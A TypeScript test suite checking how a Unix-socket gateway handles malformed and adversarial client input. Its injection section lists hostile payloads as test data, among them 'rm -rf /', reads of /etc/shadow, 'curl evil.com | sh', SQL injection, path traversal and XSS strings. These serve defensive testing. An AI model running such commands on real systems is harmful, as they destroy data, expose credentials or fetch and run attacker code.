/**
 * Gateway Edge Cases & Security Tests
 *
 * Tests for malformed input, protocol abuse, injection attempts, and other
 * adversarial client behavior. These tests verify the gateway handles
 * "stupid things clients try to send" gracefully.
 */

import { describe, it, expect, beforeEach, afterEach } from 'bun:test';
import { Gateway } from '@src/gateway/gateway.js';
import { BunNetworkDevice, BunEntropyDevice } from '@src/hal/index.js';
import type { Kernel } from '@src/kernel/kernel.js';
import type { HAL } from '@src/hal/index.js';
import type { SyscallDispatcher } from '@src/syscall/dispatcher.js';
import type { Process, Response } from '@src/syscall/types.js';
import { rmSync, existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';

// =============================================================================
// TEST HELPERS
// =============================================================================

function getTestSocketPath(): string {
    return join(tmpdir(), `monk-gateway-edge-${Date.now()}-${Math.random().toString(36).slice(2)}.sock`);
}

function createMockProcess(overrides: Partial<Process> = {}): Process {
    return {
        id: crypto.randomUUID(),
        parent: '',
        user: 'test',
        worker: {} as Worker,
        state: 'running',
        cmd: '/bin/test',
        cwd: '/',
        env: { HOME: '/', USER: 'test' },
        args: [],
        pathDirs: new Map(),
        handles: new Map(),
        nextHandle: 3,
        children: new Map(),
        nextPid: 1,
        activeStreams: new Map(),
        streamPingHandlers: new Map(),
        ...overrides,
    };
}

function createMockHAL(): HAL {
    return {
        network: new BunNetworkDevice(),
        entropy: new BunEntropyDevice(),
    } as unknown as HAL;
}

function createMockKernel(init?: Process): Kernel {
    const initProcess = init ?? createMockProcess({ cmd: '/svc/init.ts' });
    const processes = new Map<string, Process>([[initProcess.id, initProcess]]);

    return {
        hal: createMockHAL(),
        processes: {
            getInit: () => initProcess,
            get: (id: string) => processes.get(id),
            all: () => Array.from(processes.values()),
            register: (proc: Process) => {
                processes.set(proc.id, proc);
            },
            reparentOrphans: () => {},
        },
        leasedWorkers: new Map(),
        waiters: new Map(),
    } as unknown as Kernel;
}

function createMockDispatcher(
    handler?: (proc: Process, id: string, name: string, args: unknown[]) => AsyncIterable<Response>,
): SyscallDispatcher {
    const defaultHandler = async function* (): AsyncIterable<Response> {
        yield { op: 'ok', data: { success: true } };
    };

    return {
        execute: handler ?? defaultHandler,
    } as unknown as SyscallDispatcher;
}

/**
 * Send raw bytes to gateway and read response.
 */
async function sendRaw(
    socketPath: string,
    data: Uint8Array | string,
    timeout = 500,
): Promise<{ responses: string[]; closed: boolean }> {
    const network = new BunNetworkDevice();
    const socket = await network.connect(socketPath, 0);
    const responses: string[] = [];
    let closed = false;

    try {
        const bytes = typeof data === 'string'
            ? new TextEncoder().encode(data)
            : data;

        await socket.write(bytes);

        // Read responses
        let buffer = '';
        const startTime = Date.now();

        while (Date.now() - startTime < timeout) {
            try {
                const chunk = await socket.read({ timeout: 100 });

                if (chunk.length === 0) {
                    closed = true;
                    break;
                }

                buffer += new TextDecoder().decode(chunk);

                let newlineIdx: number;

                while ((newlineIdx = buffer.indexOf('\n')) !== -1) {
                    const line = buffer.slice(0, newlineIdx);
                    buffer = buffer.slice(newlineIdx + 1);

                    if (line.trim()) {
                        responses.push(line);
                    }
                }
            }
            catch {
                break;
            }
        }

        return { responses, closed };
    }
    finally {
        await socket.close().catch(() => {});
    }
}

// =============================================================================
// TESTS
// =============================================================================

describe('Gateway Edge Cases', () => {
    let socketPath: string;
    let gateway: Gateway;
    let hal: HAL;

    beforeEach(() => {
        socketPath = getTestSocketPath();
        hal = createMockHAL();
    });

    afterEach(async () => {
        if (gateway) {
            await gateway.shutdown();
        }

        if (existsSync(socketPath)) {
            rmSync(socketPath);
        }
    });

    // =========================================================================
    // MALFORMED JSON
    // =========================================================================

    describe('malformed JSON', () => {
        it('should reject truncated JSON', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, '{"id":"1","call"\n');
            expect(responses.length).toBeGreaterThan(0);

            const response = JSON.parse(responses[0]!);
            expect(response.op).toBe('error');
            expect(response.code).toBe('EINVAL');
        });

        it('should reject JSON with trailing comma', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, '{"id":"1","call":"test",}\n');
            const response = JSON.parse(responses[0]!);
            expect(response.op).toBe('error');
            expect(response.code).toBe('EINVAL');
        });

        it('should reject unquoted keys', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, '{id:"1",call:"test"}\n');
            const response = JSON.parse(responses[0]!);
            expect(response.op).toBe('error');
        });

        it('should reject single quotes', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, "{'id':'1','call':'test'}\n");
            const response = JSON.parse(responses[0]!);
            expect(response.op).toBe('error');
        });

        it('should handle empty object', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, '{}\n');
            const response = JSON.parse(responses[0]!);
            expect(response.op).toBe('error');
            expect(response.message).toContain('call');
        });

        it('should handle JSON array instead of object', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, '["id","call","args"]\n');
            const response = JSON.parse(responses[0]!);
            expect(response.op).toBe('error');
        });

        it('should handle primitive JSON values', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            for (const value of ['"string"', '42', 'true', 'false', 'null']) {
                const { responses } = await sendRaw(socketPath, value + '\n');
                // Should either return error or no response (primitive has no "call" field)
                if (responses.length > 0) {
                    const response = JSON.parse(responses[0]!);
                    expect(response.op).toBe('error');
                }
            }
        });

        it('should handle deeply nested JSON', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            // Create deeply nested object
            let nested = '{"a":';

            for (let i = 0; i < 100; i++) {
                nested += '{"b":';
            }

            nested += '"deep"';

            for (let i = 0; i < 100; i++) {
                nested += '}';
            }

            nested += '}\n';

            const { responses } = await sendRaw(socketPath, nested);
            // Should either parse successfully (and fail on missing call) or fail parsing
            expect(responses.length).toBeGreaterThan(0);

            const response = JSON.parse(responses[0]!);
            expect(response.op).toBe('error');
        });
    });

    // =========================================================================
    // TYPE CONFUSION
    // =========================================================================

    describe('type confusion', () => {
        it('should handle numeric id', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, '{"id":12345,"call":"test"}\n');
            const response = JSON.parse(responses[0]!);
            // Should coerce or use as-is
            expect(response.op).toBe('ok');
        });

        it('should handle null id', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, '{"id":null,"call":"test"}\n');
            const response = JSON.parse(responses[0]!);
            expect(response.op).toBe('ok');
        });

        it('should handle object id', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, '{"id":{"nested":"id"},"call":"test"}\n');
            const response = JSON.parse(responses[0]!);
            expect(response.op).toBe('ok');
        });

        it('should handle array call field', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, '{"id":"1","call":["file","open"]}\n');
            const response = JSON.parse(responses[0]!);
            // Array is truthy, so should attempt dispatch with stringified call
            expect(['ok', 'error']).toContain(response.op);
        });

        it('should handle numeric call field', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, '{"id":"1","call":42}\n');
            const response = JSON.parse(responses[0]!);
            expect(['ok', 'error']).toContain(response.op);
        });

        it('should handle string args instead of array', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, '{"id":"1","call":"test","args":"not-array"}\n');
            const response = JSON.parse(responses[0]!);
            // Should use empty array fallback or handle gracefully
            expect(response.op).toBe('ok');
        });
    });

    // =========================================================================
    // INJECTION ATTEMPTS
    // =========================================================================

    describe('injection attempts', () => {
        it('should pass through SQL injection payloads safely', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const sqlPayloads = [
                "'; DROP TABLE users; --",
                "1 OR 1=1",
                "1; DELETE FROM users",
                "' UNION SELECT * FROM passwords --",
                "admin'--",
            ];

            for (const payload of sqlPayloads) {
                const msg = JSON.stringify({ id: '1', call: 'test', args: [payload] });
                await sendRaw(socketPath, msg + '\n');
                // Gateway should pass payload through unchanged - it's the dispatcher's job to handle
                expect(receivedArgs[0]).toBe(payload);
            }
        });

        it('should pass through shell injection payloads safely', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const shellPayloads = [
                '; rm -rf /',
                '$(cat /etc/passwd)',
                '`whoami`',
                '| cat /etc/shadow',
                '&& curl evil.com | sh',
                '\n/bin/sh',
            ];

            for (const payload of shellPayloads) {
                const msg = JSON.stringify({ id: '1', call: 'test', args: [payload] });
                await sendRaw(socketPath, msg + '\n');
                expect(receivedArgs[0]).toBe(payload);
            }
        });

        it('should pass through path traversal payloads safely', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const pathPayloads = [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\config\\sam',
                '/etc/passwd%00.txt',
                '....//....//....//etc/passwd',
                '/proc/self/environ',
            ];

            for (const payload of pathPayloads) {
                const msg = JSON.stringify({ id: '1', call: 'file:open', args: [payload] });
                await sendRaw(socketPath, msg + '\n');
                expect(receivedArgs[0]).toBe(payload);
            }
        });

        it('should handle prototype pollution attempts', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const pollutionPayloads = [
                '{"id":"1","call":"test","__proto__":{"admin":true}}',
                '{"id":"1","call":"test","constructor":{"prototype":{"admin":true}}}',
                '{"id":"1","call":"test","args":[{"__proto__":{"polluted":true}}]}',
            ];

            for (const payload of pollutionPayloads) {
                const { responses } = await sendRaw(socketPath, payload + '\n');
                expect(responses.length).toBeGreaterThan(0);
                // Should not pollute Object prototype
                expect(({} as any).admin).toBeUndefined();
                expect(({} as any).polluted).toBeUndefined();
            }
        });

        it('should handle XSS payloads in strings', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const xssPayloads = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                'javascript:alert(1)',
                '<svg onload=alert(1)>',
            ];

            for (const payload of xssPayloads) {
                const msg = JSON.stringify({ id: '1', call: 'test', args: [payload] });
                await sendRaw(socketPath, msg + '\n');
                // Gateway passes through - it's a transport layer
                expect(receivedArgs[0]).toBe(payload);
            }
        });
    });

    // =========================================================================
    // UNICODE EDGE CASES
    // =========================================================================

    describe('unicode edge cases', () => {
        it('should handle emoji in strings', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const msg = JSON.stringify({ id: '1', call: 'test', args: ['Hello 👋 World 🌍'] });
            await sendRaw(socketPath, msg + '\n');
            expect(receivedArgs[0]).toBe('Hello 👋 World 🌍');
        });

        it('should handle null bytes in strings', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const msg = JSON.stringify({ id: '1', call: 'test', args: ['before\u0000after'] });
            await sendRaw(socketPath, msg + '\n');
            expect(receivedArgs[0]).toBe('before\u0000after');
        });

        it('should handle unicode escapes', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            // Raw JSON with unicode escapes
            const { responses } = await sendRaw(socketPath, '{"id":"1","call":"test","args":["\\u0048\\u0065\\u006c\\u006c\\u006f"]}\n');
            expect(responses.length).toBeGreaterThan(0);
            expect(receivedArgs[0]).toBe('Hello');
        });

        it('should handle surrogate pairs', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            // Emoji that requires surrogate pair
            const msg = JSON.stringify({ id: '1', call: 'test', args: ['𝕳𝖊𝖑𝖑𝖔'] });
            await sendRaw(socketPath, msg + '\n');
            expect(receivedArgs[0]).toBe('𝕳𝖊𝖑𝖑𝖔');
        });

        it('should handle right-to-left text', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const msg = JSON.stringify({ id: '1', call: 'test', args: ['مرحبا بالعالم'] });
            await sendRaw(socketPath, msg + '\n');
            expect(receivedArgs[0]).toBe('مرحبا بالعالم');
        });

        it('should handle zero-width characters', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            // Zero-width space, joiner, non-joiner
            const msg = JSON.stringify({ id: '1', call: 'test', args: ['a\u200B\u200C\u200Db'] });
            await sendRaw(socketPath, msg + '\n');
            expect(receivedArgs[0]).toBe('a\u200B\u200C\u200Db');
        });
    });

    // =========================================================================
    // BOUNDARY CONDITIONS
    // =========================================================================

    describe('boundary conditions', () => {
        it('should handle empty string call', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, '{"id":"1","call":""}\n');
            const response = JSON.parse(responses[0]!);
            // Empty string is falsy, should error
            expect(response.op).toBe('error');
        });

        it('should handle very long call name', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const longCall = 'a'.repeat(1000);
            const msg = JSON.stringify({ id: '1', call: longCall });
            const { responses } = await sendRaw(socketPath, msg + '\n', 1000);
            expect(responses.length).toBeGreaterThan(0);
        });

        it('should handle very long id', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            // Use a moderately long id (1KB) to test without timeout issues
            const longId = 'x'.repeat(1000);
            const msg = JSON.stringify({ id: longId, call: 'test' });
            const { responses } = await sendRaw(socketPath, msg + '\n', 1000);
            expect(responses.length).toBeGreaterThan(0);

            const response = JSON.parse(responses[0]!);
            expect(response.id).toBe(longId);
        });

        it('should handle empty args array', async () => {
            let receivedArgs: unknown[] | undefined;
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            await sendRaw(socketPath, '{"id":"1","call":"test","args":[]}\n');
            expect(receivedArgs).toEqual([]);
        });

        it('should handle args with many elements', async () => {
            let receivedArgs: unknown[] | undefined;
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const manyArgs = Array.from({ length: 1000 }, (_, i) => i);
            const msg = JSON.stringify({ id: '1', call: 'test', args: manyArgs });
            await sendRaw(socketPath, msg + '\n');
            expect(receivedArgs).toHaveLength(1000);
        });

        it('should handle whitespace-only lines', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            // Send whitespace lines followed by valid request
            const { responses } = await sendRaw(socketPath, '   \n\t\n  \t  \n{"id":"1","call":"test"}\n');
            // Should skip whitespace lines and process valid request
            expect(responses.length).toBeGreaterThan(0);

            const response = JSON.parse(responses[0]!);
            expect(response.op).toBe('ok');
        });

        it('should handle multiple newlines', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const { responses } = await sendRaw(socketPath, '{"id":"1","call":"test"}\n\n\n{"id":"2","call":"test"}\n');
            expect(responses.length).toBe(2);
        });
    });

    // =========================================================================
    // PROTOCOL ABUSE
    // =========================================================================

    describe('protocol abuse', () => {
        it('should handle binary garbage', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            // Random binary data with a newline
            const garbage = new Uint8Array(256);

            for (let i = 0; i < 256; i++) {
                garbage[i] = i;
            }

            garbage[255] = 10; // newline

            const { responses } = await sendRaw(socketPath, garbage);
            expect(responses.length).toBeGreaterThan(0);

            const response = JSON.parse(responses[0]!);
            expect(response.op).toBe('error');
        });

        it('should handle request without newline (partial)', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            // No newline - should buffer but not process
            const { responses, closed } = await sendRaw(socketPath, '{"id":"1","call":"test"}', 200);
            // Either no response (buffered) or connection closed
            expect(responses.length === 0 || closed).toBe(true);
        });

        it('should handle rapid request spam', async () => {
            const callCount = { value: 0 };
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* () {
                callCount.value++;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            // Send many requests rapidly
            const requests = Array.from({ length: 100 }, (_, i) =>
                JSON.stringify({ id: String(i), call: 'test' }) + '\n',
            ).join('');

            await sendRaw(socketPath, requests, 2000);

            // All requests should be processed
            expect(callCount.value).toBe(100);
        });

        it('should handle slow client (partial writes)', async () => {
            let received = false;
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* () {
                received = true;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const network = new BunNetworkDevice();
            const socket = await network.connect(socketPath, 0);

            // Send request in small chunks
            const msg = '{"id":"1","call":"test"}\n';

            for (const char of msg) {
                await socket.write(new TextEncoder().encode(char));
                await Bun.sleep(10);
            }

            // Wait for response
            await Bun.sleep(100);
            expect(received).toBe(true);

            await socket.close();
        });

        it('should handle interleaved partial messages', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const network = new BunNetworkDevice();
            const socket = await network.connect(socketPath, 0);

            // Start two messages, interleave their bytes (simulating stream corruption)
            // This should result in invalid JSON
            await socket.write(new TextEncoder().encode('{"id":"1",'));
            await socket.write(new TextEncoder().encode('"call":"test"}\n'));

            const chunk = await socket.read({ timeout: 500 });
            const response = JSON.parse(new TextDecoder().decode(chunk).split('\n')[0]!);
            expect(response.op).toBe('ok');

            await socket.close();
        });
    });

    // =========================================================================
    // RESOURCE EXHAUSTION
    // =========================================================================

    describe('resource exhaustion', () => {
        it('should handle many concurrent connections', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const network = new BunNetworkDevice();
            const sockets: Awaited<ReturnType<typeof network.connect>>[] = [];

            // Open many connections
            for (let i = 0; i < 50; i++) {
                const socket = await network.connect(socketPath, 0);
                sockets.push(socket);
            }

            expect(gateway.getClientCount()).toBe(50);

            // Close all
            await Promise.all(sockets.map(s => s.close()));

            // Give time for cleanup
            await Bun.sleep(50);
            expect(gateway.getClientCount()).toBe(0);
        });

        it('should recover after client storms', async () => {
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher();
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const network = new BunNetworkDevice();

            // Rapidly connect/disconnect
            for (let i = 0; i < 20; i++) {
                const socket = await network.connect(socketPath, 0);
                await socket.close();
            }

            await Bun.sleep(100);

            // Gateway should still work
            const { responses } = await sendRaw(socketPath, '{"id":"1","call":"test"}\n');
            const response = JSON.parse(responses[0]!);
            expect(response.op).toBe('ok');
        });
    });

    // =========================================================================
    // SPECIAL CHARACTERS IN STRINGS
    // =========================================================================

    describe('special characters', () => {
        it('should handle escaped newlines in JSON strings', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const msg = JSON.stringify({ id: '1', call: 'test', args: ['line1\nline2\nline3'] });
            await sendRaw(socketPath, msg + '\n');
            expect(receivedArgs[0]).toBe('line1\nline2\nline3');
        });

        it('should handle escaped quotes', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const msg = JSON.stringify({ id: '1', call: 'test', args: ['say "hello"'] });
            await sendRaw(socketPath, msg + '\n');
            expect(receivedArgs[0]).toBe('say "hello"');
        });

        it('should handle backslashes', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            const msg = JSON.stringify({ id: '1', call: 'test', args: ['C:\\Windows\\System32'] });
            await sendRaw(socketPath, msg + '\n');
            expect(receivedArgs[0]).toBe('C:\\Windows\\System32');
        });

        it('should handle control characters', async () => {
            let receivedArgs: unknown[] = [];
            const kernel = createMockKernel();
            const dispatcher = createMockDispatcher(async function* (_proc, _id, _name, args) {
                receivedArgs = args;
                yield { op: 'ok', data: {} };
            });
            gateway = new Gateway(dispatcher, kernel, hal);
            await gateway.listen(socketPath);

            // Tab, carriage return, form feed, backspace
            const msg = JSON.stringify({ id: '1', call: 'test', args: ['a\t\r\f\bb'] });
            await sendRaw(socketPath, msg + '\n');
            expect(receivedArgs[0]).toBe('a\t\r\f\bb');
        });
    });
});
